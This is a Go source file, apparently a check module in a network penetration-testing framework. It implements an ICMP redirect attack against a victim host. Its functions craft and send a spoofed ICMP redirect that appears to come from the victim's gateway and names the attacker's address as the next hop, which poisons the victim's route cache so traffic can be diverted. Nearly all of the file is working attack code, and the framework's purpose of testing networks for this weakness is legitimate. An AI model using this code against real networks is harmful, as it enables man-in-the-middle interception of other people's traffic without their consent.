// icmpredirect.go implements the ICMP redirect attack behavior.
//
// Durability (from the catalog): transient-decay. The attack sends ICMP
// redirect messages (type=5, code=1) to poison the victim's route cache.
// The victim's route cache entry decays naturally — no explicit teardown
// is needed. The baseline's icmpredirect_cmd enables ip_forward and
// restores it on Ctrl-C, but the behavior itself is transient: the redirect
// is advisory and the victim re-learns the correct route.

package fh

import (
	"context"
	"encoding/json"
	"net"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
)

type icmpRedirectFinding struct {
	Action   string `json:"action"`
	Gateway  string `json:"gateway"`
	Targets  string `json:"targets"`
	Redirect string `json:"redirect"`
}

// RunICMPRedirect sends one redirect to the target's victim, spoofed from
// the target's gateway, naming the attack leg's own IPv4 as the better
// hop. The quoted datagram's destination is probe content. The verdict is
// pending: whether the victim's route cache took the redirect needs a
// probe it does not have.
func RunICMPRedirect(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVictim, check.FieldVictimMAC, check.FieldGateway); err != nil {
		return check.Verdict{}, err
	}
	addr := deps.AttackLeg.Addr()
	srcGW := deps.Target.Gateway.IP
	victim := deps.Target.Victim
	redirectGW := addr.IPv4
	origDst := net.IPv4(8, 8, 8, 8)

	pkt, err := craftICMPRedirect(addr.MAC, victim, srcGW, redirectGW, origDst)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "icmpredirect: craft redirect")
	}
	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "icmpredirect: send redirect")
	}

	detail, _ := json.Marshal(icmpRedirectFinding{
		Action:   "icmp-redirect",
		Gateway:  srcGW.String(),
		Targets:  victim.IP.String(),
		Redirect: redirectGW.String(),
	})
	deps.Emitter.Finding("icmp", detail)

	return check.Pending("no observable: route cache acceptance needs a probe of the victim"), nil
}

// craftICMPRedirect builds an ICMP redirect: Ethernet → IPv4 → ICMP(type=5,
// code=1) → redirect gateway + original datagram.
func craftICMPRedirect(src net.HardwareAddr, victim check.Host, srcGW, redirectGW, origDst net.IP) ([]byte, error) {
	dstVictim := victim.IP
	eth := &layers.Ethernet{
		DstMAC:       victim.MAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      64,
		Protocol: layers.IPProtocolICMPv4,
		SrcIP:    srcGW,
		DstIP:    dstVictim,
	}
	icmp := &layers.ICMPv4{
		TypeCode: 0x0501, // type=5 (redirect), code=1 (redirect for host)
	}
	// ICMP redirect body: gateway address (4) + original IP header + 64 bits.
	origIPHdr := make([]byte, 20)
	origIPHdr[0] = 0x45
	origIPHdr[9] = 17
	copy(origIPHdr[12:16], srcGW.To4())
	copy(origIPHdr[16:20], origDst.To4())
	// Redirect gateway address first, then original datagram (IP header +
	// 64 bits of UDP header).
	origUDP := []byte{0, 0, 0, 53, 0, 8, 0, 0}
	redirectGWBytes := redirectGW.To4()
	payload := make([]byte, 0, len(redirectGWBytes)+len(origIPHdr)+len(origUDP))
	payload = append(payload, redirectGWBytes...)
	payload = append(payload, origIPHdr...)
	payload = append(payload, origUDP...)
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}
	if err := gopacket.SerializeLayers(buf, opts, eth, ip, icmp, gopacket.Payload(payload)); err != nil {
		return nil, err
	}
	return append([]byte(nil), buf.Bytes()...), nil
}
